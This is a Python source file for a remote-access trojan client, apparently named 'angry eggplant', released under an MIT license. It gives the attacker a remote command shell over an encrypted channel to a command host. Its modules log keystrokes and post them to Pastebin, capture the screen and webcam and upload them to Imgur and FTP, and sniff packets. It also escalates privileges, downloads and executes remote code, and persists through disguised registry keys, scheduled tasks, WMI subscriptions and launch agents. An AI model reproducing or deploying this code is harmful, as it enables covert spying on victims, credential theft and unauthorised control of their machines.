#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

''' 

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import time
import json
import socket
import pickle
import subprocess
from mss import mss
from uuid import uuid1
from ftplib import FTP
from struct import pack
from random import choice
from imp import new_module
from tempfile import mktemp
from zipfile import ZipFile
from requests import request
from threading import Thread
from logging import getLogger
from urllib import urlretrieve
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from base64 import b64encode, b64decode
from logging.handlers import SocketHandler
from Crypto.Util.number import long_to_bytes, bytes_to_long
if os.name is 'nt':
    from ctypes import windll
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
else:
    from pyxhook import HookManager



class Client(object):
    global get_module
    def __init__(self, *args, **kwargs):
        time.clock()
        self.mode       = 0
        self.exit       = 0
        self.jobs       = {}
        self.buffer     = str()
        self.window     = None
        self.a          = long(kwargs.get('a'))
        self.b          = long(kwargs.get('b'))
        self.c          = long(kwargs.get('c'))
        self.d          = long(kwargs.get('d'))
        self.e          = long(kwargs.get('e'))
        self.f          = repr(kwargs.get('f'))
        self.g          = long(kwargs.get('g'))
        self.q          = long(kwargs.get('q'))
        self.s          = long(kwargs.get('s'))
        self.v          = bool(kwargs.get('v'))
        self.logger     = self._logger()
        self.modules    = self._modules()
        self.results    = self._results()
        self.commands   = self._commands()

# ----------------- PRIVATE FUNCTIONS --------------------------

    def _pad(self, s):
        return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'

    def _hidden_process(self, path, shell=False):
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        p = subprocess.Popen(path, startupinfo=info)
        return p

    def _target(self, **kwargs):
        try:
            ab = request('GET', long_to_bytes(self.a), headers={'API-Key': long_to_bytes(self.b)}).json() 
            return ab[ab.keys()[0]][0].get('ip')
        except Exception as e:
            if self.v:
                print 'Target error: {}'.format(str(e))
    
    def _connect(self, host='localhost', port=1337):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print 'Connecting to {}:{}...'.format(host, port)
            s.connect((host, port))
            return s
        except Exception as e:
            if self.v:
                print 'Connection error: {}'.format(str(e))
            time.sleep(10)
            return self._connect(host, port)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self.socket.sendall(msg)
            except socket.error: return
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.v:
                print 'Send error: {}'.format(str(e))

    def _receive(self):
        try:
            data = ""
            self.socket.setblocking(False) if self.mode else self.socket.setblocking(True)
            while "\n" not in data:
                try:
                    data += self.socket.recv(1024)
                except socket.error: return
            data = self._decrypt(data.rstrip()) if len(data) else data
            return data
        except Exception as e:
            if self.v:
                print 'Receive error: {}'.format(str(e))

    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.socket.sendall(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.v:
                print 'Diffie-Hellman error: {}'.format(str(e))

    def _encrypt(self, plaintext):
        try:
            text = self._pad(bytes(plaintext))
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            return output
        except Exception as e:
            if self.v:
                print 'Error: {}'.format(str(e))

    def _decrypt(self, ciphertext):
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if check_hmac != calc_hmac:
                self.logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
            return output.rstrip(b'\0')
        except Exception as e:
            if self.v:
                print 'Decryption error: {}'.format(str(e))

    def _obfuscate(self, data, encoding=None):
        data    = bytes(data)
        p       = []
        n       = len(data)
        block   = os.urandom(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += os.urandom(1)
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def _deobfuscate(block, encoding=None):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return str().join([block[i] for i in p])

    def _show(self, dict_or_json):
        try:
            results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
        except Exception as e:
            try:
                string_repr = repr(dict_or_json)
                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                string_repr = string_repr.replace('(', '[').replace(')', ']')
                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', '\t'))
            except:
                results = repr(dict_or_json)
        return results

    def _powershell(self, cmdline):
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = sub.STARTF_USESHOWWINDOW
            info.wShowWindow = sub.SW_HIDE
            command=['powershell.exe', '/c', cmdline]
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
            results, _ = p.communicate()
            return results
        except Exception as e:
            if self.v:
                print 'Powershell error: {}'.format(str(e))

    def _results(self):
        return {
            module:{} for module in self.modules
        }

    def _modules(self):
        return {
            'webcam'        : {'status': bool(),'options': {'image': bool(),'video': bool(),'stream': bool()}, 'platforms': ['win32']},
            'keylogger'     : {'status': bool(), 'options': {'bytes': 1024, 'seconds': 300.0}, 'platforms': ['win32', 'linux2', 'darwin']},
            'screenshot'    : {'status': bool(), 'options': {}, 'platforms': ['win32', 'linux2', 'darwin']},
            'persistence'   : {'status': bool(), 'options': {'method': 'all'}, 'platforms': ['win32', 'darwin']},
            'packetsniffer' : {'status': bool(), 'options': {'seconds': 30}, 'platforms': ['linux2', 'darwin']}
        }

    def _commands(self):
        return {
            'pwd': self.pwd,
            'ls': self.ls,
            'wget': self.wget,
            'show': self.show,
            'cat': self.cat,
            'new': self.new,
            'info': self.info,
            'status': self.status,
            'unzip': self.unzip,
            'use': self.use,
            'run': self.run_modules,
            'standby': self.run_standby,
            'mode': self.get_mode,
            'admin': self.get_admin,
            'selfdestruct': self.selfdestruct
        }

    def _logger(self, port=4321):
        module_logger           = getLogger(self.info().get('IP Address'))
        module_logger.handlers  = []
        socket_handler          = SocketHandler(self._target(o=self.a, p=self.b), port)
        module_logger.addHandler(socket_handler)
        return module_logger

# ----------------- PUBLIC FUNCTIONS --------------------------

    def get_ip(self):
        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
        for target in sources:
            try:
                ip = request('GET', target).content
                if socket.inet_aton(ip):
                    return ip
            except: pass

    def get_mode(self, args=None):
        if args:
            mode, _, p = str(args).partition(' ')
            if mode == 'standby':
                self.mode = 1
                port = int(p) if len(p) else 4321
                self.logger = self._logger(port)
            else:
                self.mode = 0
        output = 'standing by' if self.mode else 'client ready'
        return output

    def get_admin(self):
        info = self.info()
        if info['Admin']:
            return {
                'User': info['login'],
                'Administrator': info['admin']
            }
        if self.f:
            if os.name is 'nt':
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
            else:
                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)

    def get_module(self, uri, name=None):
        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
        module  = new_module(name)
        source  = request('GET', uri).content
        code    = compile(source, name, 'exec')
        exec code in module.__dict__
        globals()[name] = module
        sys.modules[name] = module
        return module

    def upload_imgur(self, filename):
        with open(filename, 'rb') as fp:
            data = b64encode(fp.read())
        os.remove(filename)
        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(self.e)}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
        return result

    def upload_pastebin(self, text):
        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(self.c), 'api_user_key': long_to_bytes(self.d), 'api_option': 'paste', 'api_paste_code': text}).content
        return result
    
    def upload_ftp(self, filepath):
        try:
            host = FTP(*long_to_bytes(self.q).split())
            if self.info().get('IP Address') not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
            result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
        except Exception as e:
            result = str(e)
        return result

    def run_modules(self):
        modules = [mod for mod in self.modules if self.modules[mod].get('status') if sys.platform in self.modules[mod].get('platforms') if mod not in self.jobs]
        for module in modules:
            self.jobs[module] = Thread(target=getattr(self, module), name=module)
            self.jobs[module].start()
        if not self.mode:
            return self._show(self.results)

    def run_shell(self):
        while True:
            if self.mode:
                break
            prompt = "[%d @ {}]> ".format(os.getcwd())
            self._send(prompt, method='prompt')   
            data = self._receive()
            cmd, _, action = data.partition(' ')

            if cmd in self.commands:
                result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
            else:
                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())

            if result and len(result):
                result = '\n' + str(result) + '\n'
                self._send(result, method=cmd)

    def run_standby(self):
        while True:
            runs = time.time() + 60.0
            while time.time() < runs:
                time.sleep(1)
                if self.mode:
                    b = self._receive()
                    if b and len(b):
                        self.mode = 0 if b else 1
                else:
                    break
            data = self.run_modules()

    def main(self):
        self.socket = self._connect(host=self._target(o=self.a, p=self.b))
        self.dhkey  = self._diffiehellman()
        exit_status = 0
        if self.v:
            print 'connected successfully'
        while not exit_status:
            if not self.mode:
                self.run_shell()
            else:
                self.run_standby()
            exit_status = self.exit
        sys.exit(0)
        
# ----------------- KEYLOGGER --------------------------

    def keylogger_event(self, event):
        if event.WindowName != self.window:
            self.window = event.WindowName
            self.buffer += "\n[{}]\n".format(self.window)
        if event.Ascii > 32 and event.Ascii < 127:
            self.buffer += chr(event.Ascii)
        elif event.Ascii == 32:
            self.buffer += ' '
        elif event.Ascii in (10,13):
            self.buffer += ('\n')
        elif event.Ascii == 8:
            self.buffer = self.buffer[:-1]
        else:
            pass
        return True
        
    def keylogger_logger(self):
        while True:
            if self.exit:
                if len(self.buffer):
                    result  = self.upload_pastebin(self.buffer)
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.results['keylogger'].update({time.ctime(): result})
                break
            if time.clock() < self.modules['keylogger']['options']['seconds']:
                time.sleep(10)
            else:
                if len(self.buffer) > self.modules['keylogger']['options']['bytes']:
                    result  = self.upload_pastebin(self.buffer)
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.results['keylogger'].update({time.ctime(): result})
                    self.buffer = ''
                self.modules['keylogger']['options']['seconds'] += 300.0

    def keylogger_manager(self):
        if 'keylogger_logger' not in self.jobs:
            self.jobs['keylogger_logger'] = Thread(target=self.keylogger_logger, name=time.time())
            self.jobs['keylogger_logger'].start()
            while True:
                if self.exit:
                    break
                hm = HookManager()
                hm.KeyDown = self.keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)

# ----------------- PACKETSNIFFER --------------------------

    def packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src     = udp_hdr[0]
            dst     = udp_hdr[1]
            length  = udp_hdr[2]
            chksum  = udp_hdr[3]
            data    = data[8:]
            self.packet_buffer.append('|================== UDP HEADER ==================|')
            self.packet_buffer.append('|================================================|')
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packet_buffer.append('|================================================|')
            return data
        except Exception as e:
            self.packet_buffer.append("Error in {} header: '{}'".format('UDP', str(e)))

    def packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr  = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num  = tcp_hdr[2]
            ack_num  = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags    = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]

            self.packet_buffer.append('|================== TCP HEADER ==================|')
            self.packet_buffer.append('|================================================|')
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packet_buffer.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packet_buffer.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packet_buffer.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packet_buffer.append("Error in {} header: '{}'".format('TCP', str(e)))

    def packetsniffer_ip_header(self, data):
        try:
            ip_hdr  = struct.unpack('!6H4s4s', data[:20]) 
            ver     = ip_hdr[0] >> 12
            ihl     = (ip_hdr[0] >> 8) & 0x0f
            tos     = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id   = ip_hdr[2]
            flags   = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl     = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum  = ip_hdr[5]
            src     = socket.inet_ntoa(ip_hdr[6])
            dest    = socket.inet_ntoa(ip_hdr[7])
            data    = data[20:]

            self.packet_buffer.append('|================== IP HEADER ===================|')
            self.packet_buffer.append('|================================================|')
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packet_buffer.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packet_buffer.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packet_buffer.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packet_buffer.append("Error in {} header: '{}'".format('IP', str(e)))


    def packetsniffer_ethernet_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto   = eth_hdr[2] >> 8

            self.packet_buffer.append('|================================================|')
            self.packet_buffer.append('|================== ETH HEADER ==================|')
            self.packet_buffer.append('|================================================|')
            self.packet_buffer.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packet_buffer.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packet_buffer.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packet_buffer.append('|================================================|')

            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packet_buffer.append("Error in {} header: '{}'".format('ETH', str(e)))

    def packetsniffer_manager(self, seconds):
        limit = time.time() + float(seconds)
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = packetsniffer_ethernet_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = packetsniffer_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = packetsniffer_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = packetsniffer_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        result = self.upload_pastebin('\n'.join(self.packet_buffer))
        self.results['packetsniffer'][time.ctime()] = result
        self.packet_buffer = []
        return result

# ----------------- WEBCAM --------------------------

    def webcam_image(self):
        dev = VideoCapture(0)
        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
        r,f = dev.read()
        waitKey(1)
        imwrite(tmp, f)
        dev.release()
        self.results['webcam'][time.ctime()] = self.upload_imgur(tmp)

    def webcam_stream(self):
        dev = VideoCapture(0)
        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._target(o=self.a, p=self.b), port))
        while True:
            ret, frame = dev.read()
            data = pickle.dumps(frame)
            try:
                self._send(pack("L", len(data))+data)
            except:
                dev.release()
                break

    def webcam_video(self):
        fpath   = mktemp(suffix='.avi')
        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
        dev     = VideoCapture(0)
        end     = time.time() + 5.0
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if waitKey(0) and time.time() > end: break
        dev.release()
        self.results['webcam'][time.ctime()] = self.upload_ftp(fpath)

# ----------------- PERSISTENCE --------------------------

    def add_scheduled_task_persistence(self):
        if self.f:
            task_run    = self.f
            task_name   = os.path.splitext(os.path.basename(task_run))[0]
            try:
                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), shell=True) == 0:
                    return True
            except Exception as e:
                if self.v:
                    print 'Add scheduled task error: {}'.format(str(e))
        return False

    def remove_scheduled_task_persistence(self):
        if self.f:
            try:
                task_name = name or os.path.splitext(os.path.basename(self.f))[0]
                if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                    return True
            except: pass
            return False

    def add_startup_file_persistence(self):
        if self.f:
            try:
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if os.path.exists(startup_dir):
                    random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
                    persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % self.f
                    with file(persistence_file, 'w') as fp:
                        fp.write(content)
                    return True
            except Exception as e:
                if self.v:
                    print 'Adding startup file error: {}'.format(str(e))
        return False

    def remove_startup_file_persistence(self):
        appdata     = os.path.expandvars("%AppData%")
        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            for f in os.listdir(startup_dir):
                filepath = os.path.join(startup_dir, f)
                if filepath.endswith('.eu.url'):
                    try:
                        os.remove(filepath)
                        return True
                    except: pass
                    return False

    def add_registry_key_persistence(self, cmd=None, name='MicrosoftUpdateManager'):
        reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
        value   = cmd or self.f
        try:
            SetValueEx(reg_key, name, 0, REG_SZ, value)
            CloseKey(reg_key)
            return True
        except Exception as e:
            if self.v:
                print 'Remove registry key error: {}'.format(str(e))
        return False

    def remove_registry_key_persistence(self, name='MicrosoftUpdateManager'):
        try:
            key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
            return True
        except: pass
        return False

    def add_wmi_object_persistence(self, command=None, name='MicrosoftUpdaterManager'):
        try:
            if self.f:
                filename = self.f
                if not os.path.exists(filename):
                    return 'Error: file not found: {}'.format(filename)
                cmd_line = filename
            else:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            powershell = request('GET', long_to_bytes(self.s)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
            self._powershell(powershell)
            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
            result = self._powershell(code)
            if name in result:
                return True
        except Exception as e:
            if self.v:
                print 'WMI persistence error: {}'.format(str(e))
        return False

    def remove_wmi_object_persistence(self, name='MicrosoftUpdaterManager'):
        try:
            code =''' 
            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
            result = self._powershell(code)
            if not result:
                return True
        except: pass
        return False

    def add_hidden_file_persistence(self):
        try:
            name = os.path.basename(self.f)
            if os.name is 'nt':
                hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
            else:
                hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                if hide:
                    self.f = os.path.join(os.path.dirname('.' + name), '.' + name)
            if hide:
                return True
        except Exception as e:
            if self.v:
                print 'Adding hidden file error: {}'.format(str(e))
        return False

    def remove_hidden_file_persistence(self, *args, **kwargs):
        try:
            return subprocess.call('attrib -h {}'.format(self.f), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
        except Exception as e:
            if self.v:
                print 'Error unhiding file: {}'.format(str(e))
        return False
            

    def add_launch_agent_persistence(self, name='com.apple.update.manager'):
        try:
            code    = request('GET', long_to_bytes(self.g)).content
            label   = name
            fpath   = mktemp(suffix='.sh')
            bash    = code.replace('__LABEL__', label).replace('__FILE__', self.f)
            fileobj = file(fpath, 'w')
            fileobj.write(bash)
            fileobj.close()
            self.results['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
            bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            return True
        except Exception as e2:
            if self.v:
                print 'Error: {}'.format(str(e2))
        return False

    def remove_launch_agent_persistence(self, name=None):
        try:
            name = name or os.path.splitext(os.path.basename(self.f))[0]
            os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
            return True
        except: pass
        return False

# ----------------- MODULES --------------------------

    def persistence(self):
        persistence_methods = ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']
        for method in persistence_methods:
            if method not in self.results['persistence']:
                result = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
                self.results['persistence'][method] = result
            else:
                if method in self.results['persistence']:
                    result = self.results['persistence'].remove(method) if getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))() else None
        _ = self.jobs.pop('persistence', None)
        return result

    def screenshot(self):
        tmp = mktemp(suffix='.png')
        with mss() as screen:
            img = screen.shot(output=tmp)
        result = self.upload_imgur(img)
        self.results['screenshot'][time.ctime()] = result
        _ =  self.jobs.pop('screenshot', None)
        return result

    def keylogger(self):
        if 'keylogger' in self.jobs:
            if not self.jobs['keylogger'].is_alive():
                self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
                self.jobs['keylogger'].start()
                result = 'Keylogger started at {}'.format(time.ctime())
            else:
                runtime = time.time() - float(self.jobs['keylogger'].name)
                result  = 'Current session duration: {}'.format(self.get_status(runtime))
        else:
            self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
            self.jobs['keylogger'].start()
            result = 'Keylogger started at {}'.format(time.ctime())
        self.results['keylogger'][time.ctime()] = result
        _ = self.jobs.pop('keylogger', None)
        return result

    def webcam(self):
        if self.modules['webcam']['options']['image']:
            result = self.webcam_image()
        elif self.modules['webcam']['options']['video']:
            result = self.webcam_video()
        self.results['webcam'][time.ctime()] = result
        _ = self.jobs.pop('webcam', None)
        return result

    def packetsniffer(self):
        if 'packetsniffer' not in self.jobs:
            try:
                seconds = self.modules['packetsniffer']['options']['seconds']
                result  = self.packetsniffer(seconds)
            except Exception as e:
                result  = 'Error monitoring network traffic: {}'.format(str(e))
            _ = self.jobs.pop('packetsniffer', None)
        else:
            result = 'packetsniffer is already monitoring network traffic'
        return result

# ----------------- COMMANDS --------------------------

    def pwd(self,**kwargs): return os.getcwd()
    
